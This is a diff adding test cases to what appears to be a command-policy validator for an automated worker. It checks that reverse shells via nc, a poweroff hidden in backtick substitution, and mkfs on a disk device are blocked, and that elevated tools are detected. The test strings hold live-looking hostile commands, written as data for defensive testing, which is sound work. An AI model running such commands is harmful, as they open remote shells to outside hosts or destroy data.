@@ -416,3 +416,53 @@ describe('elevation names a binary, not a script that shares its name', () => {
     },
   );
 });
+
+describe('substitution is a command boundary', () => {
+  it.each([
+    'echo `nc -e /bin/sh 1.2.3.4 4444`',
+    'echo "hi" ; `poweroff`',
+    'echo $(nc host 1)',
+  ])('refuses %s', (command) => {
+    // Backticks delimit a command as surely as `;` does. `$(` survived only
+    // because `(` was already a separator; the backtick form was not.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+});
+
+describe('a filename ends in an extension, however many dots it has', () => {
+  it.each([
+    'npm test src/core/shutdown.test.ts',
+    'vitest run src/halt.test.ts',
+    'npm test -- reboot.spec.ts',
+    'npx vitest run src/nc.test.ts',
+    'make -C build halt.o',
+    // The middle segment is not itself a known extension, so only reading the
+    // LAST one gets this right.
+    'vitest run src/shutdown.integration.ts',
+    'npm test src/reboot.e2e.ts',
+  ])('allows %s', (command) => {
+    // Judged on the LAST dot-segment: an anchored match on the first saw
+    // `test` in `shutdown.test.ts` and refused it — non-retryably, through the
+    // scorer, on a command the child could never make succeed.
+    expect(commandPolicyViolation(command)).toBeNull();
+  });
+
+  it('still treats a binary suffix as part of the name', () => {
+    expect(commandPolicyViolation('nc.openbsd -e /bin/sh')).toMatch(/Blocked command detected/);
+    expect(commandPolicyViolation('mkfs.ext4 /dev/sda1')).toMatch(/Blocked command detected/);
+  });
+});
+
+describe('elevated tool names that carry a dash', () => {
+  it.each([
+    ['docker-compose up -d', 'docker'],
+    ['iptables-restore < f', 'iptables'],
+    ['ip6tables-save', 'ip6tables'],
+    ['flock /tmp/l sudo apt-get install -y x', 'sudo'],
+  ])('%s is elevated', (command, expected) => {
+    // The old matcher used `\b`, which ends a name at a dash. Requiring
+    // whitespace instead downgraded these from `execute_elevated` (DENY) to
+    // `execute` (ASK, auto-approved for an unattended worker).
+    expect(matchElevatedCommand(command)).toBe(expected);
+  });
+});
